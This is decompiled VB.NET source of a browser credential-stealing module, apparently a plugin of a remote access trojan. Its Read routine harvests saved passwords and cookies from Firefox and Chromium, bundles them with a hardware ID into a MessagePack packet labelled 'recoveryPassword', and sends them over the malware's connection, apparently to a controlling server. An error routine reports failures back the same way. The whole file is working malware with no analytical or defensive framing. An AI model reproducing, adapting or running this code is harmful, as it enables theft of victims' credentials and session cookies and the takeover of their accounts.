Imports System
Imports System.Text
Imports Plugin.Browsers.Chromium
Imports Plugin.Browsers.Firefox
Imports Plugin.MessagePack

Namespace Plugin
	' Token: 0x02000003 RID: 3
	Public Module Packet
		' Token: 0x06000012 RID: 18 RVA: 0x00002444 File Offset: 0x00000644
		Public Sub Read()
			Try
				Dim Credentials As StringBuilder = New StringBuilder()
				New Firefox().CredRecovery(Credentials)
				New Chromium().Recovery(Credentials)
				Dim Cookies As StringBuilder = New StringBuilder()
				New Firefox().CookiesRecovery(Cookies)
				New Chromium().CookiesRecovery(Cookies)
				Dim msgpack As MsgPack = New MsgPack()
				msgpack.ForcePathObject("Packet").AsString = "recoveryPassword"
				msgpack.ForcePathObject("Password").AsString = Credentials.ToString()
				msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid
				msgpack.ForcePathObject("Cookies").AsString = Cookies.ToString()
				Connection.Send(msgpack.Encode2Bytes())
			Catch ex As Exception
				Packet.[Error](ex.Message)
				Connection.Disconnected()
			End Try
		End Sub

		' Token: 0x06000013 RID: 19 RVA: 0x00002528 File Offset: 0x00000728
		Public Sub [Error](ex As String)
			Dim msgpack As MsgPack = New MsgPack()
			msgpack.ForcePathObject("Packet").AsString = "Error"
			msgpack.ForcePathObject("Error").AsString = ex
			Connection.Send(msgpack.Encode2Bytes())
		End Sub
	End Module
End Namespace
